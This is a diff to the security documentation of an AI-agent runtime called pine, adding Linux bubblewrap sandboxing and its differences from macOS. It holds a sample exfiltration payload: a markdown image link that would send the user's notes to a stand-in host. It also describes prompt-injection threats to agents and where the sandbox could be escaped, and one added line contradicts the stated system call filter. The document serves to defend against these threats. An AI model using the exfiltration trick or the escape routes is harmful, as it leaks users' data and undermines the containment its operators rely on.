@@ -70,16 +70,25 @@ gets the reduced run back.
 
 ### 3. The sandbox
 
-Every shell command and every file tool call of an agent runs inside a macOS sandbox
-(`sandbox-exec`) whose rules start from "deny everything":
+Every shell command and every file tool call of an agent runs inside a sandbox of the
+operating system: Apple's `sandbox-exec` on macOS, [bubblewrap](https://github.com/containers/bubblewrap)
+(`bwrap`) on Linux. The rules are the same on both:
 
 | | |
 |---|---|
 | Can read | Its workspace, its private home, its skills, pine's manual (`docs/`), temp, and the system outside your home folder (programs, libraries) |
 | Can write | Its workspace, its private home (`sandbox/<id>/`, which is `$HOME` in its shell), temp. The main agent also `USER.md` in pine's home, and nothing else there |
 | Cannot read or write | Your home folder, pine's home (configuration, `.env`, database, other agents' folders), other agents' workspaces |
-| Cannot | Use the network (unless `sandbox.network` or you granted it to the conversation; the `download` tool is the exception described under Modes), signal or inspect other processes, launch apps, send AppleScript, reach the keychain or the clipboard |
+| Cannot | Use the network (unless `sandbox.network` or you granted it to the conversation; the `download` tool is the exception described under Modes), signal or inspect other processes, or reach the services of your session: launching apps, AppleScript, the keychain or keyring, the clipboard, the session bus, the container daemon, an ssh agent |
 | Environment | A handful of variables (`PATH`, `LANG`, ...). Nothing from the daemon's environment, no secrets |
+
+How the two systems say it differs. On macOS the sandbox gets a profile that starts from
+"deny everything" and allows what the table lists. On Linux the command is given a file
+system of its own: everything read-only, your home folder and pine's home as empty folders
+with the agent's own folders put back, a process list and a `/dev` of its own, no network
+device, and a system call filter that refuses sockets to other programs on the machine
+(behind those are the session bus, the keyring, a container daemon, a terminal multiplexer).
+"On Linux" below lists where that leaves a difference.
 
 The file tools (`read`, `write`, `edit`, `grep`, `find`, `ls`) do their I/O through the same
 sandbox rather than in the daemon. That closes the usual gap of "check the path, then open it":
@@ -94,6 +103,49 @@ content started. Only you can open one; agents have no tool for it. pine's home,
 program and other agents' workspaces are refused, also as part of a larger folder. The
 folder's `AGENTS.md` and `CLAUDE.md` become instructions to the agent, so open folders whose
 authors you would let instruct it. See [coding.md](coding.md).
+
+#### On Linux
+
+bubblewrap has to be installed (`apt install bubblewrap`, `dnf install bubblewrap`,
+`pacman -S bubblewrap`) and has to be allowed to create user namespaces. pine tries it once at
+start. Where it does not work, `pine check` gives the reason and pine behaves as on a machine
+without a sandbox (below). The usual reasons:
+
+- **Ubuntu 24.04 and later** restrict user namespaces through AppArmor. Give bubblewrap a
+  profile that allows them: a file `/etc/apparmor.d/bwrap` with
+
+  ```
+  abi <abi/4.0>,
+  include <tunables/global>
+
+  profile bwrap /usr/bin/bwrap flags=(unconfined) {
+    userns,
+  }
+  ```
+
+  loaded with `sudo apparmor_parser -r /etc/apparmor.d/bwrap`. (Setting
+  `kernel.apparmor_restrict_unprivileged_userns=0` does it for every program instead.)
+- **A container** (Docker, Podman) forbids a sandbox inside it. With pine as root in the
+  container it needs `--cap-add SYS_ADMIN --cap-add NET_ADMIN --security-opt
+  seccomp=unconfined --security-opt apparmor=unconfined --security-opt
+  systempaths=unconfined` (or `--privileged`). Without them pine in a container has no agent
+  sandbox; the container is then the only wall, and it is around all agents and pine's secrets
+  together.
+- **A systemd unit** with `RestrictNamespaces=` or `PrivateUsers=`.
+
+What differs from macOS:
+
+| | macOS | Linux |
+|---|---|---|
+| Your home folder, pine's home | Access is refused | They are empty, read-only folders: a command sees that they exist, and in them only the way to the folders it was given |
+| Instruction files, and a repository's hooks and configuration, in a run that read outside content (layer 4) | Cannot be written or created, at any depth | What exists is read-only. What did not exist can be created by a shell command, and pine removes it when the command ends. Both are looked for six folders deep, and not inside folders of installed packages or build output (`node_modules`, `.venv`, `dist`, `build`, `target` and the like) |
+| Programs on the same machine (the session bus, the keyring, a container daemon, a terminal multiplexer, an editor's helper) | Without the network, no connection of any kind. Keychain, clipboard, AppleScript and launching apps are refused by name, also with the network | Without the network a command cannot make a socket to another program (a system call filter, on x86-64 and arm64; programs built for 32 bit do not run then). The session's folder (`/run/user`) is empty and the sockets in `/run` are covered, also with the network |
+| With the network granted | Also programs that listen on a socket file where the agent can read | The same, and those that listen on a socket without a file (an X server does) |
+| Processes a command leaves in the background | Not ended by the sandbox | End with the command |
+| pine run as root | Commands run as root | Commands run as root without root's special powers (capabilities), which they could otherwise use to undo the sandbox |
+
+The file tools refuse a protected name at any depth on both systems; the rows above about
+depth concern shell commands only.
 
 The code pane of the terminal UI reads through the daemon, not through an agent: it lists and
 shows files of the conversation's folder only, with links resolved, and runs `git` for the
@@ -111,9 +163,10 @@ Consequences worth knowing:
 - `git`, `node`, `python`, `sed` and the like work. Tools that need files in your home
   (`~/.gitconfig`, `~/.npmrc`, `~/.ssh`) see the agent's empty private home instead. Grant
   specific folders with `sandbox.read` / `sandbox.write`.
-- On a platform without `sandbox-exec`, pine withholds the `bash` tool from every agent whose
+- On a machine without a working sandbox (Linux without bubblewrap or without user
+  namespaces, any other system), pine withholds the `bash` tool from every agent whose
   sandbox is on, does not run the commands of `command` sources, and file tools fall back to a
-  path check in the daemon. `"sandbox": false` runs the shell unconfined and leaves the file
+  path check in the daemon. `pine check` says so, and why. `"sandbox": false` runs the shell unconfined and leaves the file
   tools only a check that keeps pine's secrets closed; `pine check` reports it for every such
   agent that has `bash`.
 - Local MCP servers are not sandboxed. They are your programs with your rights.
@@ -242,7 +295,7 @@ the workspace, byte for byte, and reports size and SHA-256.
 - A picture at a web address is fetched only when you click it, never because an answer
   contains it. Otherwise `![](https://somewhere/?q=<your notes>)` in an answer would send data
   out the moment it is displayed.
-- Picture files are decoded by macOS's `sips` and videos by `ffmpeg`, both started without
+- Picture files are decoded by macOS's `sips` (on Linux by `ffmpeg`) and videos by `ffmpeg`, both started without
   network access and without write access outside the temp folder, because the bytes can come
   from anywhere. "Open in player" hands the file to the system's player, which has no such
   limits; it only happens on your click.
@@ -338,8 +391,8 @@ daemon restarts.
   files, no more network, not your environment, and instruction files read-only. It cannot read
   pine's secrets or write its configuration. You see the command line before it is set up, in
   every mode. What it prints is outside content unless you say the source is yours. If that
-  agent has `"sandbox": false`, the command runs unconfined, as its shell does; on a platform
-  without `sandbox-exec` it is not run at all.
+  agent has `"sandbox": false`, the command runs unconfined, as its shell does; on a machine
+  without a working sandbox it is not run at all.
 - **Status lines** (when a source last looked, what it found) are read by agents without the
   mark that outside content gets. A source therefore repeats a found value there only when it
   is a number or a single word.
@@ -460,14 +513,20 @@ itself can be fooled by a page, but it has nothing to give away and cannot act.
   type the main agent wrote and you confirmed: the dialog shows what it is, not what it does. A server that can delete mail can
   delete mail when an agent asks; mark such servers `"approve": "tainted"` or `"always"`.
 - **Shell with network.** `sandbox.network: true` lets commands reach the internet and your
-  local network, including an unauthenticated model server. Prefer the `web` server or a
+  local network, including an unauthenticated model server, and programs on this machine that
+  listen on a socket file where the agent can read (a tmux server, an editor's helper, an ssh
+  agent in the temp folder): some of those run commands for whoever connects. Prefer the `web` server or a
   `commands` tool for the one thing that needs the network.
 - **A signed-in browser.** With a persistent `profile`, the bundled browser acts as you on every
   site you signed in to. A hostile page can ask the agent to click things there. Keep signed-in
   profiles for tasks you start and watch yourself.
-- **The sandbox is Apple's.** `sandbox-exec` is deprecated but is what Apple's own tools and
-  other agent runtimes use; a kernel or sandbox bug would be a way out. For stronger isolation
-  run the daemon under a separate macOS user with no access to your files.
+- **The sandbox is the operating system's.** On macOS, `sandbox-exec` is deprecated but is
+  what Apple's own tools and other agent runtimes use. On Linux, bubblewrap is what Flatpak
+  uses; pine adds no system call filter to it. On both, a kernel or sandbox bug would be a
+  way out. For stronger isolation run the daemon under a separate user with no access to your
+  files.
+- **Linux: new instruction files exist until the command ends**, and are looked for six
+  folders deep. See "On Linux" under layer 3.
 - **Local users.** Another account on the machine that can read pine's home has everything.
   Keep the home at mode 700.
 - **Model quality.** A small quantised model follows hostile text more readily than a large one.
